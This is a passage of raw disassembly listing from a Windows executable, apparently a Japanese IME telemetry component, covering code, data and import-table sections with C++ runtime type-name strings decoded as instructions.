  40574b:	pop    edi
  40574c:	call   0x404560
  405751:	mov    esp,ebp
  405753:	pop    ebp
  405754:	ret    
  405755:	int3   
  405756:	int3   
  405757:	int3   
  405758:	int3   
  405759:	int3   
  40575a:	int3   
  40575b:	int3   
  40575c:	int3   
  40575d:	int3   
  40575e:	int3   
  40575f:	int3   
  405760:	push   0x406570
  405765:	call   DWORD PTR ds:0x407044
  40576b:	ret    
  40576c:	int3   
  40576d:	int3   
  40576e:	int3   
  40576f:	int3   
  405770:	int3   
  405771:	int3   
  405772:	int3   
  405773:	int3   
  405774:	int3   
  405775:	int3   
  405776:	int3   
  405777:	int3   
  405778:	int3   
  405779:	int3   
  40577a:	int3   
  40577b:	int3   
  40577c:	int3   
  40577d:	int3   
  40577e:	int3   
  40577f:	int3   
  405780:	jmp    0x403817
  405785:	int3   
  405786:	int3   
  405787:	int3   
  405788:	int3   
  405789:	int3   
  40578a:	int3   
  40578b:	int3   
  40578c:	int3   
  40578d:	int3   
  40578e:	int3   
  40578f:	int3   
  405790:	mov    DWORD PTR ds:0x40600c,0x40114c
  40579a:	ret    
  40579b:	int3   
  40579c:	int3   
  40579d:	int3   
  40579e:	int3   
  40579f:	int3   
  4057a0:	mov    DWORD PTR ds:0x406010,0x40114c
  4057aa:	ret    
  4057ab:	int3   
  4057ac:	int3   
  4057ad:	int3   
  4057ae:	int3   
  4057af:	int3   
  4057b0:	mov    DWORD PTR ds:0x406014,0x40114c
  4057ba:	ret    
  4057bb:	int3   
  4057bc:	int3   
  4057bd:	int3   
  4057be:	int3   
  4057bf:	int3   
  4057c0:	and    al,BYTE PTR ds:0x11993
  4057c6:	add    BYTE PTR [eax],al
  4057c8:	in     al,0x57
  4057ca:	inc    eax
	...
  4057df:	add    BYTE PTR [ecx],al
  4057e1:	add    BYTE PTR [eax],al
  4057e3:	add    bh,bh
  4057e5:	(bad)  
  4057e6:	(bad)  
  4057e7:	push   DWORD PTR ds:0x22004056
  4057ed:	add    eax,0x21993
  4057f2:	add    BYTE PTR [eax],al
  4057f4:	adc    BYTE PTR [eax+0x40],bl
	...
  40580b:	add    BYTE PTR [ecx],al
  40580d:	add    BYTE PTR [eax],al
  40580f:	add    bh,bh
  405811:	(bad)  
  405812:	(bad)  
  405813:	jmp    DWORD PTR [edi+0x56]
  405816:	inc    eax
  405817:	add    BYTE PTR [eax],al
  405819:	add    BYTE PTR [eax],al
  40581b:	add    BYTE PTR [edi+0x56],ch
  40581e:	inc    eax
  40581f:	add    ah,ah
  405821:	(bad)  
  405822:	(bad)  
  405823:	inc    DWORD PTR [eax]
  405825:	add    BYTE PTR [eax],al
  405827:	add    BYTE PTR [edi+edi*8+0xffff],al
  40582e:	add    BYTE PTR [eax],al
  405830:	(bad)  
  405831:	(bad)  
  405832:	(bad)  
  405833:	call   esi
  405835:	inc    esp
  405836:	inc    eax
  405837:	add    dl,bl
  405839:	inc    esp
  40583a:	inc    eax
  40583b:	add    dh,bh
  40583d:	(bad)  
  40583e:	(bad)  
  40583f:	dec    DWORD PTR [edx-0x61ffbfbc]
  405845:	inc    esp
  405846:	inc    eax
  405847:	add    ah,ah
  405849:	(bad)  
  40584a:	(bad)  
  40584b:	inc    DWORD PTR [eax]
  40584d:	add    BYTE PTR [eax],al
  40584f:	add    al,cl
  405851:	(bad)  
  405852:	(bad)  
  405853:	inc    DWORD PTR [eax]
  405855:	add    BYTE PTR [eax],al
  405857:	add    dh,bh
  405859:	(bad)  
  40585a:	(bad)  
  40585b:	inc    DWORD PTR [eax]
  40585d:	add    BYTE PTR [eax],al
  40585f:	add    BYTE PTR [edx],al
  405861:	inc    esi
  405862:	inc    eax
  405863:	add    BYTE PTR [eax],al
  405865:	add    BYTE PTR [eax],al
  405867:	add    dh,bh
  405869:	(bad)  
  40586a:	(bad)  
  40586b:	inc    DWORD PTR [eax]
  40586d:	add    BYTE PTR [eax],al
  40586f:	add    ah,dl
  405871:	(bad)  
  405872:	(bad)  
  405873:	inc    DWORD PTR [eax]
  405875:	add    BYTE PTR [eax],al
  405877:	add    dh,bh
  405879:	(bad)  
  40587a:	(bad)  
  40587b:	jmp    FWORD PTR [edi+eax*2]
  40587e:	inc    eax
  40587f:	add    BYTE PTR [eax],dh
  405881:	inc    edi
  405882:	inc    eax
  405883:	add    BYTE PTR [eax],al
  405885:	add    BYTE PTR [eax],al
  405887:	add    dh,bh
  405889:	(bad)  
  40588a:	(bad)  
  40588b:	inc    DWORD PTR [eax]
  40588d:	add    BYTE PTR [eax],al
  40588f:	add    al,bl
  405891:	(bad)  
  405892:	(bad)  
  405893:	inc    DWORD PTR [eax]
  405895:	add    BYTE PTR [eax],al
  405897:	add    dh,bh
  405899:	(bad)  
  40589a:	(bad)  
  40589b:	(bad)  
  40589c:	jnp    0x4058e6
  40589e:	inc    eax
  40589f:	add    BYTE PTR [esi+0x40004048],cl
	...
  4058ad:	add    BYTE PTR [eax],al
  4058af:	add    BYTE PTR [ecx+0x4000404e],cl
	...
  4058bd:	add    BYTE PTR [eax],al
  4058bf:	add    BYTE PTR [eax],cl
  4058c1:	dec    edi
  4058c2:	inc    eax
  4058c3:	add    bh,bh
  4058c5:	(bad)  
  4058c6:	(bad)  
  4058c7:	inc    DWORD PTR [eax]
  4058c9:	add    BYTE PTR [eax],al
  4058cb:	add    bh,bh
  4058cd:	(bad)  
  4058ce:	(bad)  
  4058cf:	inc    DWORD PTR [eax]
  4058d1:	add    BYTE PTR [eax],al
  4058d3:	add    BYTE PTR [ecx],al
  4058d5:	add    BYTE PTR [eax],al
  4058d7:	add    BYTE PTR [eax],al
  4058d9:	add    BYTE PTR [eax],al
  4058db:	add    BYTE PTR [ecx],al
  4058dd:	add    BYTE PTR [eax],al
  4058df:	add    BYTE PTR [eax],al
  4058e1:	add    BYTE PTR [eax],al
  4058e3:	add    BYTE PTR [edx],ah
  4058e5:	add    eax,0x41993
  4058ea:	add    BYTE PTR [eax],al
  4058ec:	les    ebx,FWORD PTR [eax+0x40]
  4058ef:	add    BYTE PTR [edx],al
  4058f1:	add    BYTE PTR [eax],al
  4058f3:	add    BYTE PTR [eax],cl
  4058f5:	pop    ecx
  4058f6:	inc    eax
	...
  405903:	add    BYTE PTR [ecx],al
  405905:	add    BYTE PTR [eax],al
  405907:	add    BYTE PTR [edx],al
  405909:	add    BYTE PTR [eax],al
  40590b:	add    BYTE PTR [edx],al
  40590d:	add    BYTE PTR [eax],al
  40590f:	add    BYTE PTR [ebx],al
  405911:	add    BYTE PTR [eax],al
  405913:	add    BYTE PTR [ecx],al
  405915:	add    BYTE PTR [eax],al
  405917:	add    BYTE PTR [eax+ebx*2+0x40],dh
  40591e:	add    BYTE PTR [eax],al
  405920:	add    BYTE PTR [eax],al
  405922:	add    BYTE PTR [eax],al
  405924:	add    eax,DWORD PTR [eax]
  405926:	add    BYTE PTR [eax],al
  405928:	add    DWORD PTR [eax],eax
  40592a:	add    BYTE PTR [eax],al
  40592c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40592d:	pop    eax
  40592e:	inc    eax
  40592f:	add    BYTE PTR [eax],al
  405931:	add    BYTE PTR [eax],al
  405933:	add    BYTE PTR [eax+0x4d],ah
  405936:	inc    eax
  405937:	add    BYTE PTR [eax],al
  405939:	add    BYTE PTR [eax],al
  40593b:	add    BYTE PTR [eax+0x59],al
  40593e:	inc    eax
  40593f:	add    BYTE PTR [edx],al
  405941:	add    BYTE PTR [eax],al
  405943:	add    BYTE PTR [ecx+ebx*2+0x40],cl
  405947:	add    BYTE PTR [eax+0x59],ch
  40594a:	inc    eax
  40594b:	add    BYTE PTR [eax],dl
  40594d:	add    BYTE PTR [eax],al
  40594f:	add    BYTE PTR [eax+0x60],dl
  405952:	inc    eax
  405953:	add    BYTE PTR [eax],al
  405955:	add    BYTE PTR [eax],al
  405957:	add    bh,bh
  405959:	(bad)  
  40595a:	(bad)  
  40595b:	inc    DWORD PTR [eax]
  40595d:	add    BYTE PTR [eax],al
  40595f:	add    BYTE PTR [eax+eax*1],cl
  405962:	add    BYTE PTR [eax],al
  405964:	mov    al,ds:0x404c
  405969:	add    BYTE PTR [eax],al
  40596b:	add    BYTE PTR [eax+eiz*2+0x40],ch
  40596f:	add    BYTE PTR [eax],al
  405971:	add    BYTE PTR [eax],al
  405973:	add    bh,bh
  405975:	(bad)  
  405976:	(bad)  
  405977:	inc    DWORD PTR [eax]
  405979:	add    BYTE PTR [eax],al
  40597b:	add    BYTE PTR [eax+eax*1],cl
  40597e:	add    BYTE PTR [eax],al
  405980:	add    BYTE PTR [ebp+0x40],dl
  405983:	add    BYTE PTR [eax],al
  405985:	add    BYTE PTR [eax],al
  405987:	add    BYTE PTR [eax+eiz*2+0x40],al
  40598e:	add    BYTE PTR [eax],al
  405990:	(bad)  
  405991:	(bad)  
  405992:	(bad)  
  405993:	inc    DWORD PTR [eax]
  405995:	add    BYTE PTR [eax],al
  405997:	add    BYTE PTR [eax+eax*1],cl
  40599a:	add    BYTE PTR [eax],al
  40599c:	add    BYTE PTR [ebp+0x40],cl
  40599f:	add    BYTE PTR [eax],al
  4059a1:	add    BYTE PTR [eax],al
  4059a3:	add    BYTE PTR [eax+0x4d],dh
  4059a6:	inc    eax
  4059a7:	add    BYTE PTR [eax],al
  4059a9:	add    BYTE PTR [eax],al
  4059ab:	add    BYTE PTR [eax+0x3004059],dh
  4059b1:	add    BYTE PTR [eax],al
  4059b3:	add    al,al
  4059b5:	pop    ecx
  4059b6:	inc    eax
  4059b7:	add    BYTE PTR [ecx+ebx*2+0x59680040],al
  4059be:	inc    eax
  4059bf:	add    BYTE PTR [eax],al
  4059c1:	add    BYTE PTR [eax],al
  4059c3:	add    BYTE PTR [eax+eiz*2+0x40],ah
  4059ca:	add    BYTE PTR [eax],al
  4059cc:	(bad)  
  4059cd:	(bad)  
  4059ce:	(bad)  
  4059cf:	inc    DWORD PTR [eax]
  4059d1:	add    BYTE PTR [eax],al
  4059d3:	add    BYTE PTR [eax+eax*1],cl
  4059d6:	add    BYTE PTR [eax],al
  4059d8:	add    BYTE PTR [ebp+0x40],cl
  4059db:	add    BYTE PTR [eax],al
  4059dd:	add    BYTE PTR [eax],al
  4059df:	add    BYTE PTR [eax+0x4d],dh
  4059e2:	inc    eax
  4059e3:	add    BYTE PTR [eax],al
  4059e5:	add    BYTE PTR [eax],al
  4059e7:	add    ah,ch
  4059e9:	pop    ecx
  4059ea:	inc    eax
  4059eb:	add    BYTE PTR [ebx],al
  4059ed:	add    BYTE PTR [eax],al
  4059ef:	add    ah,bh
  4059f1:	pop    ecx
  4059f2:	inc    eax
  4059f3:	add    BYTE PTR [ecx+ebx*2+0x59680040],al
  4059fa:	inc    eax
  4059fb:	add    BYTE PTR [eax],al
  4059fd:	add    BYTE PTR [eax],al
  4059ff:	add    ah,al
  405a01:	pusha  
  405a02:	inc    eax
  405a03:	add    BYTE PTR [eax],al
  405a05:	add    BYTE PTR [eax],al
  405a07:	add    bh,bh
  405a09:	(bad)  
  405a0a:	(bad)  
  405a0b:	inc    DWORD PTR [eax]
  405a0d:	add    BYTE PTR [eax],al
  405a0f:	add    BYTE PTR [eax+eax*1],cl
  405a12:	add    BYTE PTR [eax],al
  405a14:	add    BYTE PTR [ebp+0x40],cl
	...

Disassembly of section .data:

00406000 <.data>:
  406000:	add    DWORD PTR [eax],eax
  406002:	add    BYTE PTR [eax],al
  406004:	dec    esi
  406005:	out    0x40,al
  406007:	mov    ebx,0x44bf19b1
  40600c:	adc    DWORD PTR fs:[eax+0x0],eax
  406010:	xchg   esp,eax
  406011:	adc    DWORD PTR [eax+0x0],eax
  406014:	rcl    BYTE PTR [ecx],1
  406016:	inc    eax
  406017:	add    BYTE PTR [eax],al
  406019:	add    BYTE PTR [eax],al
  40601b:	add    BYTE PTR [esi],ch
  40601d:	es inc eax
	...
  406047:	add    bh,bh
  406049:	(bad)  
  40604a:	(bad)  
  40604b:	inc    DWORD PTR [ecx]
  40604d:	add    BYTE PTR [eax],al
  40604f:	add    BYTE PTR [eax],ah
  406051:	adc    DWORD PTR [eax+0x0],eax
  406054:	add    BYTE PTR [eax],al
  406056:	add    BYTE PTR [eax],al
  406058:	cs aas 
  40605a:	inc    ecx
  40605b:	push   esi
  40605c:	bound  esp,QWORD PTR [ecx+0x64]
  40605f:	pop    edi
  406060:	popa   
  406061:	ins    BYTE PTR es:[edi],dx
  406062:	ins    BYTE PTR es:[edi],dx
  406063:	outs   dx,DWORD PTR ds:[esi]
  406064:	arpl   WORD PTR [eax+0x73],ax
  406067:	je     0x4060cd
  406069:	inc    eax
  40606a:	inc    eax
  40606b:	add    BYTE PTR [eax],ah
  40606d:	adc    DWORD PTR [eax+0x0],eax
  406070:	add    BYTE PTR [eax],al
  406072:	add    BYTE PTR [eax],al
  406074:	cs aas 
  406076:	inc    ecx
  406077:	push   esi
  406078:	gs js  0x4060de
  40607b:	gs jo  0x4060f2
  40607e:	imul   ebp,DWORD PTR [edi+0x6e],0x20004040
  406085:	adc    DWORD PTR [eax+0x0],eax
  406088:	add    BYTE PTR [eax],al
  40608a:	add    BYTE PTR [eax],al
  40608c:	cs aas 
  40608e:	inc    ecx
  40608f:	push   esi
  406090:	ins    BYTE PTR es:[edi],dx
  406091:	outs   dx,DWORD PTR ds:[esi]
  406092:	imul   esp,DWORD PTR [bp+di+0x5f],0x6f727265
  40609a:	jb     0x4060dc
  40609c:	jae    0x406112
  40609e:	fs inc eax
  4060a0:	inc    eax
  4060a1:	add    BYTE PTR [eax],al
  4060a3:	add    BYTE PTR [eax],ah
  4060a5:	adc    DWORD PTR [eax+0x0],eax
  4060a8:	add    BYTE PTR [eax],al
  4060aa:	add    BYTE PTR [eax],al
  4060ac:	cs aas 
  4060ae:	inc    ecx
  4060af:	push   esi
  4060b0:	ins    BYTE PTR es:[edi],dx
  4060b1:	outs   dx,BYTE PTR gs:[esi]
  4060b3:	addr16 je 0x40611e
  4060b6:	pop    edi
  4060b7:	gs jb  0x40612c
  4060ba:	outs   dx,DWORD PTR ds:[esi]
  4060bb:	jb     0x4060fd
  4060bd:	jae    0x406133
  4060bf:	fs inc eax
  4060c1:	inc    eax
  4060c2:	add    BYTE PTR [eax],al
  4060c4:	and    BYTE PTR [ecx],dl
  4060c6:	inc    eax
  4060c7:	add    BYTE PTR [eax],al
  4060c9:	add    BYTE PTR [eax],al
  4060cb:	add    BYTE PTR [esi],ch
  4060cd:	aas    
  4060ce:	inc    ecx
  4060cf:	push   esi
  4060d0:	outs   dx,DWORD PTR ds:[esi]
  4060d1:	jne    0x406147
  4060d3:	pop    edi
  4060d4:	outs   dx,DWORD PTR ds:[esi]
  4060d5:	pop    di
  4060d7:	jb     0x40613a
  4060d9:	outs   dx,BYTE PTR ds:[esi]
  4060da:	addr16 gs inc eax
  4060dd:	jae    0x406153
  4060df:	fs inc eax
  4060e1:	inc    eax
  4060e2:	add    BYTE PTR [eax],al
  4060e4:	and    BYTE PTR [ecx],dl
  4060e6:	inc    eax
  4060e7:	add    BYTE PTR [eax],al
  4060e9:	add    BYTE PTR [eax],al
  4060eb:	add    BYTE PTR [esi],ch
  4060ed:	aas    
  4060ee:	inc    ecx
  4060ef:	push   esi
  4060f0:	dec    edx
  4060f1:	popa   
  4060f2:	jo     0x406155
  4060f4:	outs   dx,BYTE PTR ds:[esi]
  4060f5:	gs jae 0x40615d
  4060f8:	dec    ecx
  4060f9:	ins    DWORD PTR es:[edi],dx
  4060fa:	gs push esp
  4060fc:	jb     0x40615f
  4060fe:	arpl   WORD PTR [ebp+0x4c],sp
  406101:	outs   dx,DWORD PTR ds:[esi]
  406102:	addr16 imul ebp,DWORD PTR [bp+0x67],0x656c6554
  40610b:	ins    DWORD PTR es:[edi],dx
  40610c:	gs je  0x406181
  40610f:	jns    0x406151
  406111:	inc    eax
  406112:	add    BYTE PTR [eax],al
  406114:	and    BYTE PTR [ecx],dl
  406116:	inc    eax
  406117:	add    BYTE PTR [eax],al
  406119:	add    BYTE PTR [eax],al
  40611b:	add    BYTE PTR [esi],ch
  40611d:	aas    
  40611e:	inc    ecx
  40611f:	push   esi
  406120:	push   esp
  406121:	jb     0x406184
  406123:	arpl   WORD PTR [ebp+0x4c],sp
  406126:	outs   dx,DWORD PTR ds:[esi]
  406127:	addr16 imul ebp,DWORD PTR [bp+0x67],0x766f7250
  406130:	imul   esp,DWORD PTR [ebp+eiz*2+0x72],0x6c697740
  406138:	inc    eax
  406139:	inc    eax
  40613a:	add    BYTE PTR [eax],al
  40613c:	and    BYTE PTR [ecx],dl
  40613e:	inc    eax
  40613f:	add    BYTE PTR [eax],al
  406141:	add    BYTE PTR [eax],al
  406143:	add    BYTE PTR [esi],ch
  406145:	aas    
  406146:	inc    ecx
  406147:	push   ebp
  406148:	dec    ecx
  406149:	inc    esi
  40614a:	popa   
  40614b:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0x6c614365
  406153:	ins    BYTE PTR es:[edi],dx
  406154:	bound  esp,QWORD PTR [ecx+0x63]
  406157:	imul   eax,DWORD PTR [eax+0x64],0x65
  40615b:	je     0x4061be
  40615d:	imul   ebp,DWORD PTR [ebx+esi*2+0x40],0x406c6977
  406165:	inc    eax
	...

Disassembly of section .idata:

00407000 <.idata>:
  407000:	pushf  
  407001:	jae    0x407003
  407003:	add    BYTE PTR [edx-0x3bffff8d],dh
  407009:	jae    0x40700b
  40700b:	add    dl,bl
  40700d:	jae    0x40700f
  40700f:	add    BYTE PTR [edi+esi*2+0x0],ch
  407013:	add    BYTE PTR [esi+0x77],dl
  407016:	add    BYTE PTR [eax],al
  407018:	cmp    al,0x77
  40701a:	add    BYTE PTR [eax],al
  40701c:	es ja  0x40701f
  40701f:	add    BYTE PTR [edx],dl
  407021:	ja     0x407023
  407023:	add    BYTE PTR [edi+esi*2],al
  407026:	add    BYTE PTR [eax],al
  407028:	lock jbe 0x40702b
  40702b:	add    al,ah
  40702d:	jbe    0x40702f
  40702f:	add    BYTE PTR [eax],al
  407031:	add    BYTE PTR [eax],al
  407033:	add    dh,dh
  407035:	je     0x407037
  407037:	add    ah,cl
  407039:	js     0x40703b
  40703b:	add    BYTE PTR [esi-0x51ffff88],bh
  407041:	js     0x407043
  407043:	add    BYTE PTR [esi+0x7a000078],dl
  407049:	js     0x40704b
  40704b:	add    BYTE PTR [esi+0x78],ah
  40704e:	add    BYTE PTR [eax],al
  407050:	push   edx
  407051:	js     0x407053
  407053:	add    BYTE PTR [esi],dh
  407055:	js     0x407057
  407057:	add    BYTE PTR [esi],ah
  407059:	js     0x40705b
  40705b:	add    BYTE PTR [eax+edi*2],cl
  40705e:	add    BYTE PTR [eax],al
  407060:	div    BYTE PTR [edi+0x0]
  407063:	add    al,ah
  407065:	ja     0x407067
  407067:	add    dh,al
  407069:	ja     0x40706b
  40706b:	add    BYTE PTR [edx-0x6bffff89],dh
  407071:	ja     0x407073
  407073:	add    BYTE PTR [edx+0x7a000077],al
  407079:	ja     0x40707b
  40707b:	add    al,bh
  40707d:	jae    0x40707f
  40707f:	add    BYTE PTR [edx],cl
  407081:	je     0x407083
  407083:	add    BYTE PTR [eax],ah
  407085:	je     0x407087
  407087:	add    BYTE PTR [esp+esi*2],dh
  40708a:	add    BYTE PTR [eax],al
  40708c:	inc    esi
  40708d:	je     0x40708f
  40708f:	add    BYTE PTR [esp+esi*2+0x0],bl
  407093:	add    BYTE PTR [esi+0x74],ch
  407096:	add    BYTE PTR [eax],al
  407098:	jle    0x40710e
  40709a:	add    BYTE PTR [eax],al
  40709c:	mov    ?,WORD PTR [eax+eax*1+0x0]
  4070a0:	sahf   
  4070a1:	je     0x4070a3
  4070a3:	add    BYTE PTR [eax-0x43ffff8c],dh
  4070a9:	je     0x4070ab
  4070ab:	add    dh,dl
  4070ad:	je     0x4070af
  4070af:	add    dl,ch
  4070b1:	je     0x4070b3
  4070b3:	add    BYTE PTR [eax],al
  4070b5:	add    BYTE PTR [eax],al
  4070b7:	add    BYTE PTR [edi],dh
  4070b9:	add    eax,DWORD PTR [eax]
  4070bb:	cmp    BYTE PTR [ecx],0x3
  4070be:	add    BYTE PTR [eax+0x0],al
  4070c4:	mov    esi,0x76
  4070c9:	add    BYTE PTR [eax],al
  4070cb:	add    BYTE PTR [edx],dl
  4070cd:	jne    0x4070cf
  4070cf:	add    BYTE PTR [eax],ch
  4070d1:	jne    0x4070d3
  4070d3:	add    BYTE PTR [eax],al
  4070d5:	add    BYTE PTR [eax],al
  4070d7:	add    BYTE PTR [esi+esi*2],dl
  4070da:	add    BYTE PTR [eax],al
  4070dc:	(bad)  
  4070dd:	jne    0x4070df
  4070df:	add    dl,dh
  4070e1:	jne    0x4070e3
  4070e3:	add    dh,bl
  4070e5:	jne    0x4070e7
  4070e7:	add    al,dl
  4070e9:	jne    0x4070eb
  4070eb:	add    dh,al
  4070ed:	jne    0x4070ef
  4070ef:	add    BYTE PTR [esi-0x49ffff8b],bh
  4070f5:	jne    0x4070f7
  4070f7:	add    BYTE PTR [ebp+esi*2+0x75920000],ah
  4070fe:	add    BYTE PTR [eax],al
  407100:	test   BYTE PTR [ebp+0x0],dh
  407103:	add    BYTE PTR [ebp+esi*2+0x0],dh
  407107:	add    BYTE PTR [esi+esi*2],bl
  40710a:	add    BYTE PTR [eax],al
  40710c:	pop    edx
  40710d:	jne    0x40710f
  40710f:	add    BYTE PTR [esi+0x75],cl
  407112:	add    BYTE PTR [eax],al
  407114:	es jbe 0x407117
  407117:	add    BYTE PTR [esi+esi*2],dh
  40711a:	add    BYTE PTR [eax],al
  40711c:	ds jbe 0x40711f
  40711f:	add    BYTE PTR [esi+0x76],dl
  407122:	add    BYTE PTR [eax],al
  407124:	push   0x76
  407126:	add    BYTE PTR [eax],al
  407128:	js     0x4071a0
  40712a:	add    BYTE PTR [eax],al
  40712c:	call   0xf24071a9
  407131:	js     0x407133
  407133:	add    BYTE PTR [edx],al
  407135:	jns    0x407137
  407137:	add    BYTE PTR [esi],cl
  407139:	jns    0x40713b
  40713b:	add    BYTE PTR [eax],bl
  40713d:	jns    0x40713f
  40713f:	add    BYTE PTR [eax],ch
  407141:	jns    0x407143
  407143:	add    BYTE PTR [ecx+edi*2+0x0],al
  407147:	add    BYTE PTR [edx+0x79],ah
  40714a:	add    BYTE PTR [eax],al
  40714c:	jle    0x4071c7
  40714e:	add    BYTE PTR [eax],al
  407150:	xchg   esi,eax
  407151:	jns    0x407153
  407153:	add    BYTE PTR [edx-0x37ffff87],dh
  407159:	jns    0x40715b
  40715b:	add    dh,bl
  40715d:	jns    0x40715f
  40715f:	add    BYTE PTR [esi+0x75],ah
  407162:	add    BYTE PTR [eax],al
  407164:	cli    
  407165:	jns    0x407167
  407167:	add    BYTE PTR [eax],al
  407169:	add    BYTE PTR [eax],al
  40716b:	add    BYTE PTR [edx-0x6dffff8a],ah
  407171:	jbe    0x407173
  407173:	add    al,ch
  407175:	jns    0x407177
  407177:	add    BYTE PTR [eax],al
  407179:	add    BYTE PTR [eax],al
  40717b:	add    BYTE PTR [eax+0x32],dl
  40717e:	inc    eax
  40717f:	add    BYTE PTR [eax],ah
  407181:	jb     0x407183
	...
  40718b:	add    dl,ch
  40718d:	jae    0x40718f
  40718f:	add    BYTE PTR [eax],al
  407191:	jo     0x407193
  407193:	add    BYTE PTR [edx+esi*2+0x0],dl
	...
  40719f:	add    BYTE PTR [esi*2+0x70340000],al
  4071a6:	add    BYTE PTR [eax],al
  4071a8:	in     al,dx
  4071a9:	jb     0x4071ab
	...
  4071b3:	add    BYTE PTR [esi],dh
  4071b5:	jne    0x4071b7
  4071b7:	add    ah,cl
  4071b9:	jo     0x4071bb
  4071bb:	add    al,bl
  4071bd:	jb     0x4071bf
	...
  4071c7:	add    BYTE PTR [edx+0x75],al
  4071ca:	add    BYTE PTR [eax],al
  4071cc:	mov    eax,0xf8000070
  4071d1:	jb     0x4071d3
	...
  4071db:	add    BYTE PTR [eax],cl
  4071dd:	jbe    0x4071df
  4071df:	add    al,bl
  4071e1:	jo     0x4071e3
  4071e3:	add    BYTE PTR [ebx+esi*2+0x0],cl
  4071ea:	add    BYTE PTR [eax],al
  4071ec:	add    BYTE PTR [eax],al
  4071ee:	add    BYTE PTR [eax],al
  4071f0:	mov    ah,0x76
  4071f2:	add    BYTE PTR [eax],al
  4071f4:	ins    BYTE PTR es:[edi],dx
  4071f5:	jno    0x4071f7
  4071f7:	add    ah,ah
  4071f9:	jb     0x4071fb
	...
  407203:	add    ah,dl
  407205:	jbe    0x407207
  407207:	add    ah,al
  407209:	jo     0x40720b
	...
  40721f:	add    BYTE PTR [ebx+esi*2+0x73b20000],bl
  407226:	add    BYTE PTR [eax],al
  407228:	les    esi,FWORD PTR [ebx+0x0]
  40722b:	add    dl,bl
  40722d:	jae    0x40722f
  40722f:	add    BYTE PTR [edi+esi*2+0x0],ch
  407233:	add    BYTE PTR [esi+0x77],dl
  407236:	add    BYTE PTR [eax],al
  407238:	cmp    al,0x77
  40723a:	add    BYTE PTR [eax],al
  40723c:	es ja  0x40723f
  40723f:	add    BYTE PTR [edx],dl
  407241:	ja     0x407243
  407243:	add    BYTE PTR [edi+esi*2],al
  407246:	add    BYTE PTR [eax],al
  407248:	lock jbe 0x40724b
  40724b:	add    al,ah
  40724d:	jbe    0x40724f
  40724f:	add    BYTE PTR [eax],al
  407251:	add    BYTE PTR [eax],al
  407253:	add    dh,dh
  407255:	je     0x407257
  407257:	add    ah,cl
  407259:	js     0x40725b
  40725b:	add    BYTE PTR [esi-0x51ffff88],bh
  407261:	js     0x407263
  407263:	add    BYTE PTR [esi+0x7a000078],dl
  407269:	js     0x40726b
  40726b:	add    BYTE PTR [esi+0x78],ah
  40726e:	add    BYTE PTR [eax],al
  407270:	push   edx
  407271:	js     0x407273
  407273:	add    BYTE PTR [esi],dh
  407275:	js     0x407277
  407277:	add    BYTE PTR [esi],ah
  407279:	js     0x40727b
  40727b:	add    BYTE PTR [eax+edi*2],cl
  40727e:	add    BYTE PTR [eax],al
  407280:	div    BYTE PTR [edi+0x0]
  407283:	add    al,ah
  407285:	ja     0x407287
  407287:	add    dh,al
  407289:	ja     0x40728b
  40728b:	add    BYTE PTR [edx-0x6bffff89],dh
  407291:	ja     0x407293
  407293:	add    BYTE PTR [edx+0x7a000077],al
  407299:	ja     0x40729b
  40729b:	add    al,bh
  40729d:	jae    0x40729f
  40729f:	add    BYTE PTR [edx],cl
  4072a1:	je     0x4072a3
  4072a3:	add    BYTE PTR [eax],ah
  4072a5:	je     0x4072a7
  4072a7:	add    BYTE PTR [esp+esi*2],dh
  4072aa:	add    BYTE PTR [eax],al
  4072ac:	inc    esi
  4072ad:	je     0x4072af
  4072af:	add    BYTE PTR [esp+esi*2+0x0],bl
  4072b3:	add    BYTE PTR [esi+0x74],ch
  4072b6:	add    BYTE PTR [eax],al
  4072b8:	jle    0x40732e
  4072ba:	add    BYTE PTR [eax],al
  4072bc:	mov    ?,WORD PTR [eax+eax*1+0x0]
  4072c0:	sahf   
  4072c1:	je     0x4072c3
  4072c3:	add    BYTE PTR [eax-0x43ffff8c],dh
  4072c9:	je     0x4072cb
  4072cb:	add    dh,dl
  4072cd:	je     0x4072cf
  4072cf:	add    dl,ch
  4072d1:	je     0x4072d3
  4072d3:	add    BYTE PTR [eax],al
  4072d5:	add    BYTE PTR [eax],al
  4072d7:	add    BYTE PTR [edi],dh
  4072d9:	add    eax,DWORD PTR [eax]
  4072db:	cmp    BYTE PTR [ecx],0x3
  4072de:	add    BYTE PTR [eax+0x0],al
  4072e4:	mov    esi,0x76
  4072e9:	add    BYTE PTR [eax],al
  4072eb:	add    BYTE PTR [edx],dl
  4072ed:	jne    0x4072ef
  4072ef:	add    BYTE PTR [eax],ch
  4072f1:	jne    0x4072f3
  4072f3:	add    BYTE PTR [eax],al
  4072f5:	add    BYTE PTR [eax],al
  4072f7:	add    BYTE PTR [esi+esi*2],dl
  4072fa:	add    BYTE PTR [eax],al
  4072fc:	(bad)  
  4072fd:	jne    0x4072ff
  4072ff:	add    dl,dh
  407301:	jne    0x407303
  407303:	add    dh,bl
  407305:	jne    0x407307
  407307:	add    al,dl
  407309:	jne    0x40730b
  40730b:	add    dh,al
  40730d:	jne    0x40730f
  40730f:	add    BYTE PTR [esi-0x49ffff8b],bh
  407315:	jne    0x407317
  407317:	add    BYTE PTR [ebp+esi*2+0x75920000],ah
  40731e:	add    BYTE PTR [eax],al
  407320:	test   BYTE PTR [ebp+0x0],dh
  407323:	add    BYTE PTR [ebp+esi*2+0x0],dh
  407327:	add    BYTE PTR [esi+esi*2],bl
  40732a:	add    BYTE PTR [eax],al
  40732c:	pop    edx
  40732d:	jne    0x40732f
  40732f:	add    BYTE PTR [esi+0x75],cl
  407332:	add    BYTE PTR [eax],al
  407334:	es jbe 0x407337
  407337:	add    BYTE PTR [esi+esi*2],dh
  40733a:	add    BYTE PTR [eax],al
  40733c:	ds jbe 0x40733f
  40733f:	add    BYTE PTR [esi+0x76],dl
  407342:	add    BYTE PTR [eax],al
  407344:	push   0x76
  407346:	add    BYTE PTR [eax],al
  407348:	js     0x4073c0
  40734a:	add    BYTE PTR [eax],al
  40734c:	call   0xf24073c9
  407351:	js     0x407353
  407353:	add    BYTE PTR [edx],al
  407355:	jns    0x407357
  407357:	add    BYTE PTR [esi],cl
  407359:	jns    0x40735b
  40735b:	add    BYTE PTR [eax],bl
  40735d:	jns    0x40735f
  40735f:	add    BYTE PTR [eax],ch
  407361:	jns    0x407363
  407363:	add    BYTE PTR [ecx+edi*2+0x0],al
  407367:	add    BYTE PTR [edx+0x79],ah
  40736a:	add    BYTE PTR [eax],al
  40736c:	jle    0x4073e7
  40736e:	add    BYTE PTR [eax],al
